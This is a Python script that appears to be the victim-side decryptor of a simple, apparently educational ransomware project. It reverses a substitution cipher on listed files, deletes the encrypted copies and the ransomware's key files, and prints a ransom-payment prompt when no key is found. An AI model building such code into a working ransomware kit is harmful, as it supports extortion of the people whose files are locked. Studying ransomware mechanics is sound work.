"""
Python Victim file Decryption script
"""

import os
import sys

# Global Variables
alphabet_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Functions
def dec(key, files):
    """
    Decryption Algorithm & Mechanism
    """

    """
    # Get list of all encrypted files
    enc_list = {}
    with open("encrypted.lst", "r") as read_enc_list:
        line = read_enc_list.readline()
        while line:
            curr_row = line.split("=")
            file_name = curr_row[0]
            file_ext = curr_row[1]
            enc_list[file_name] = file_ext
            line = read_enc_list.readline()
        read_enc_list.close()

    for file_name, file_ext in enc_list.items():
        print("{} : {}".format(file_name, file_ext))
    """

    plaintext = "" 
    for file in files:
        print("File : {}".format(file))
        file_name = os.path.splitext(file)[0]
        file_ext = os.path.splitext(file)[1]
        
        # Read file contents
        content = ""
        plaintext = ""

        print("Encrypted File : {}".format(file_name + ".enc"))
        with open(file_name + ".enc", "r") as read_enc_data:
            content = read_enc_data.read()
            read_enc_data.close()

        # Decrypt File contents with substitution cipher
        for char in content:
            # Reverse the substitution process according to cipherlist
            # print("Current Letter : {}".format(char))
            if char.upper() in key:
                # Check if character is in the alphabet_list
                symbol_index = key.find(char.upper()) # Find the current character in the alphabet list
                if char.isupper():
                    # Is lower : Set to upper case
                    # print("Key Character in Index {} : {}".format(symbol_index, alphabet_list[symbol_index].upper()))
                    plaintext += alphabet_list[symbol_index].upper()
                else:
                    # Is Upper : Set to lower case
                    # print("Key Character in Index {} : {}".format(symbol_index, alphabet_list[symbol_index].lower()))
                    plaintext += alphabet_list[symbol_index].lower()
            else:
                # Just add that character/symbol
                plaintext += char

            # Check plaintext
            print("Contents : {}".format(plaintext))

        # Write decrypted contents into plain file
        print("Decrypted File : {}".format(file_name + ".txt"))
        print("Plaintext : {}".format(plaintext))
        with open(file_name + ".txt", "w") as dec_file:
            # Encrypt file
            dec_file.write(plaintext)
            dec_file.close()
    
        # Delete original file
        os.remove(file_name + ".enc")

def cleanup():
    """
    Clean up all ransomware files
    """
    files = [
        "key.txt",
        "ransomprvkey.pem",
        "ransompublickey.pem",
        "encrypted.lst"
    ]
    for file in files:
        os.remove(file)

def release():
    """
    Decryption process after payment
    """
    path = "./"
    # files = os.listdir(path)
    files = []

    if os.path.isfile("key.txt"):
        key = open("key.txt", "r").read()

        # Open List of encrypted files
        with open("encrypted.lst", "r") as read_encrypted: 
            line = read_encrypted.readline() # Read current line
            while line:
                # Process current line
                curr_file = line.split("=")
                curr_filename = curr_file[0]
                curr_file_ext = curr_file[1]
                curr_file_full = "{}{}".format(curr_filename, curr_file_ext)
                files.append(curr_file_full)
                # Read Next Line
                line = read_encrypted.readline() 
            read_encrypted.close()

        dec(key, files) # Get Cipher List
    else:
        print("Please pay the amount to {} before getting the key.".format("your-name")) 
        exit()

def main():
    release()
    cleanup()

if __name__ == "__main__":
    main()

